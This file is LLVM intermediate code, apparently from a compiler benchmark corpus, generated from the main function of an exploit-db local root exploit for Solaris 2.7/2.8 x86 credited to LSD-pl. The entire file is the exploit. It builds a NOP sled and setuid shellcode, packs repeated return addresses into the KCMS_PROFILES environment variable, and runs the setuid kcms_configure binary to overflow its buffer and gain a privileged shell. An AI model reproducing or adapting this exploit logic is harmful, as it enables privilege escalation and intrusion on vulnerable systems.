; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_20768.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_20768.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM dec 1999 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [51 x i8] c"kcsSUNWIOsolf.so for solaris 2.7 2.8 (2.6 ?) x86\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [27 x i8] c"usage: %s xserver:display\0A\00", align 1
@jump = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [11 x i8] c"DISPLAY=%s\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"xxx=\00", align 1
@NOPNUM = common dso_local global i32 0, align 4
@setuidshellcode = common dso_local global i32* null, align 8
@.str.5 = private unnamed_addr constant [15 x i8] c"KCMS_PROFILES=\00", align 1
@ADRNUM = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [32 x i8] c"/usr/openwin/bin/kcms_configure\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"lsd\00", align 1
@.str.8 = private unnamed_addr constant [3 x i8] c"-o\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [20000 x i8], align 16
  %7 = alloca i8*, align 8
  %8 = alloca [4 x i8], align 1
  %9 = alloca [4 x i8*], align 16
  %10 = alloca [128 x i8], align 16
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.1, i64 0, i64 0))
  %14 = load i32, i32* %4, align 4
  %15 = icmp ne i32 %14, 2
  br i1 %15, label %16, label %22

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0), i8* %19)
  %21 = call i32 @exit(i32 -1) #3
  unreachable

22:                                               ; preds = %2
  %23 = load i64, i64* @jump, align 8
  %24 = inttoptr i64 %23 to i32 (...)*
  %25 = call i32 (...) %24()
  %26 = add i32 %25, 2300
  %27 = add i32 %26, 8000
  %28 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 0
  %29 = bitcast i8* %28 to i32*
  store i32 %27, i32* %29, align 1
  %30 = getelementptr inbounds [128 x i8], [128 x i8]* %10, i64 0, i64 0
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 (i8*, i8*, ...) @sprintf(i8* %30, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0), i8* %33)
  %35 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 0
  %36 = getelementptr inbounds [4 x i8*], [4 x i8*]* %9, i64 0, i64 0
  store i8* %35, i8** %36, align 16
  %37 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 17000
  %38 = getelementptr inbounds [4 x i8*], [4 x i8*]* %9, i64 0, i64 1
  store i8* %37, i8** %38, align 8
  %39 = getelementptr inbounds [128 x i8], [128 x i8]* %10, i64 0, i64 0
  %40 = getelementptr inbounds [4 x i8*], [4 x i8*]* %9, i64 0, i64 2
  store i8* %39, i8** %40, align 16
  %41 = getelementptr inbounds [4 x i8*], [4 x i8*]* %9, i64 0, i64 3
  store i8* null, i8** %41, align 8
  %42 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 0
  store i8* %42, i8** %7, align 8
  %43 = load i8*, i8** %7, align 8
  %44 = call i32 (i8*, i8*, ...) @sprintf(i8* %43, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0))
  %45 = load i8*, i8** %7, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 4
  store i8* %46, i8** %7, align 8
  store i32 0, i32* %11, align 4
  br label %47

47:                                               ; preds = %54, %22
  %48 = load i32, i32* %11, align 4
  %49 = load i32, i32* @NOPNUM, align 4
  %50 = icmp slt i32 %48, %49
  br i1 %50, label %51, label %57

51:                                               ; preds = %47
  %52 = load i8*, i8** %7, align 8
  %53 = getelementptr inbounds i8, i8* %52, i32 1
  store i8* %53, i8** %7, align 8
  store i8 -112, i8* %52, align 1
  br label %54

54:                                               ; preds = %51
  %55 = load i32, i32* %11, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %11, align 4
  br label %47

57:                                               ; preds = %47
  store i32 0, i32* %11, align 4
  br label %58

58:                                               ; preds = %72, %57
  %59 = load i32, i32* %11, align 4
  %60 = load i32*, i32** @setuidshellcode, align 8
  %61 = call i32 @strlen(i32* %60)
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %75

63:                                               ; preds = %58
  %64 = load i32*, i32** @setuidshellcode, align 8
  %65 = load i32, i32* %11, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i32, i32* %64, i64 %66
  %68 = load i32, i32* %67, align 4
  %69 = trunc i32 %68 to i8
  %70 = load i8*, i8** %7, align 8
  %71 = getelementptr inbounds i8, i8* %70, i32 1
  store i8* %71, i8** %7, align 8
  store i8 %69, i8* %70, align 1
  br label %72

72:                                               ; preds = %63
  %73 = load i32, i32* %11, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %11, align 4
  br label %58

75:                                               ; preds = %58
  %76 = load i8*, i8** %7, align 8
  store i8 0, i8* %76, align 1
  %77 = getelementptr inbounds [20000 x i8], [20000 x i8]* %6, i64 0, i64 17000
  store i8* %77, i8** %7, align 8
  %78 = load i8*, i8** %7, align 8
  %79 = call i32 (i8*, i8*, ...) @sprintf(i8* %78, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.5, i64 0, i64 0))
  %80 = load i8*, i8** %7, align 8
  %81 = getelementptr inbounds i8, i8* %80, i64 14
  store i8* %81, i8** %7, align 8
  store i32 0, i32* %11, align 4
  br label %82

82:                                               ; preds = %94, %75
  %83 = load i32, i32* %11, align 4
  %84 = load i32, i32* @ADRNUM, align 4
  %85 = icmp slt i32 %83, %84
  br i1 %85, label %86, label %97

86:                                               ; preds = %82
  %87 = load i32, i32* %11, align 4
  %88 = srem i32 %87, 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 %89
  %91 = load i8, i8* %90, align 1
  %92 = load i8*, i8** %7, align 8
  %93 = getelementptr inbounds i8, i8* %92, i32 1
  store i8* %93, i8** %7, align 8
  store i8 %91, i8* %92, align 1
  br label %94

94:                                               ; preds = %86
  %95 = load i32, i32* %11, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %11, align 4
  br label %82

97:                                               ; preds = %82
  %98 = load i8*, i8** %7, align 8
  store i8 0, i8* %98, align 1
  %99 = getelementptr inbounds [4 x i8*], [4 x i8*]* %9, i64 0, i64 0
  %100 = call i32 @execle(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0), i32 0, i8** %99)
  %101 = load i32, i32* %3, align 4
  ret i32 %101
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @execle(i8*, i8*, i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
